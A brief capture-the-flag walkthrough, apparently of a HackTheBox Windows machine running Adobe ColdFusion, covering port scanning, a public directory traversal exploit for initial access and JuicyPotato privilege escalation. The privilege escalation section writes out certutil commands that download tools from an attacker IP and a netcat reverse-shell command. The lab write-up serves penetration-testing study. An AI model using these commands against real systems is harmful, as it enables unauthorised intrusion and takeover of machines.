# Arctic

### Nmap Full port scan (TCP)

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### Nmap Aggressive scan

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

### Enumerating Port 8500

Searching port 8500 online ([https://www.speedguide.net/port.php?port=8500](https://www.speedguide.net/port.php?port=8500)) —> could be Macromedia ColdFusion MX Server using that port.

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Heading to `http://10.10.10.11:8500` on the web browser

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

Searching online `CFIDE` exploit —> **Adobe ColdFusion - Directory Traversal**

[https://www.exploit-db.com/exploits/50057](https://www.exploit-db.com/exploits/50057)

Edit the IP addr and ports

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Got user shell

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

* `SeImpersonatePrivilege` is enables —> vulnerable to Juicy Potato PrivEsc.
* Transfer `nc64.exe` and `juicypotato.exe` to victim

```bash
certutil -urlcache -f <http://10.10.14.6/juicypotato.exe> juicypotato.exe
certutil -urlcache -f <http://10.10.14.6/nc64.exe> nc64.exe
```

* Open netcat listener on attacker using `nc -lvp 443`
* Run JuicyPotato attack

```bash
juicypotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\users\\tolis\\Desktop\\nc64.exe -e cmd.exe 10.10.14.6 443" -t *
```

* Got root shell

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
